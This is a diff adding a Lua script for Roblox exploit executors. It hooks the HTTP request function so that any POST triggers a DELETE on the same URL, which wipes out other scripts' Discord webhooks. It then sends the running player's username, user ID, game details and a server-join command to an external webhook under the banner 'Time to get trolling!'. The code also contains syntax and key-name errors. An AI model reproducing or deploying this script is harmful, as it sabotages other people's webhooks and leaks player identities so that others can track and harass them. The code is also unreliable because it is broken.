@@ -1,0 +1,77 @@
+-- anti webhook (not by me)
+local synapse, shithttp = syn and syn.request, http and http.request
+local request = http_request or request or HttpPost or synapse or shithttp
+local webhookdetect
+webhookdetect = hookfunction(request, function(self)
+    if self.Method and self.Method == "POST" and self.Url then
+        local abcdef = { Url = self.Url, Method = "DELETE" }
+        request(abcdef)
+    end
+    return webhookdetect(self)
+end)
+
+local data = {
+   ["content"] = "",
+   ["embeds"] = {
+       {
+           ["title"] = "**Player Found**",
+           ["description"] = "Time to get trolling!",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name)
+           },
+           ["field"] = {
+            {
+             ["name"] = "**Game:**",
+             ["value"] = game.Name,
+             ["inline"] = true
+            },
+            {
+             ["name"] = "**Max Players:**",
+             ["value"] = game.Players.MaxPlayers,
+             ["inline"] = true
+            },
+            {
+             ["name"] = "**Username:**",
+             ["value"] = game.Players.LocalPlayer.Name.." (@"..game.Players.LocalPlayer.DisplayName..")",
+             ["inline"] = true
+            },
+            {
+             ["name"] = "**User ID:**",
+             ["value"] = game.Players.LocalPlayer.UserId,
+             ["inline"] = true
+            },
+            {
+             ["name"] = "**Player Ingame:**",
+             ["value"] = #game.Players:GetPlayers(),
+             ["inline"] = true
+            },
+            {
+             ["name"] = "**Script ID:**",
+             ["value"] = _G.ScriptID,
+             ["inline"] = true
+            },
+            {
+             ["name"] = "**Job ID:**",
+             ["value"] = "Roblox.GameLauncher.joinGameInstance("..game.PlaceId..", '"..game.JobId.."')",
+             ["inline"] = true
+            },
+          }
+          ["footer"] = {
+            ["text"] = "Run the Job ID code in the inspect element console while in roblox website to join them."
+          }
+       }
+   }
+}
+
+request(
+  {
+    Url  = _G.webhook, 
+    Body = game:GetService("HttpService"):JSONEncode(data), 
+    Method = "POST", 
+    Headers = {
+      ["content-type"] = "application/json"
+    }
+  }
+)
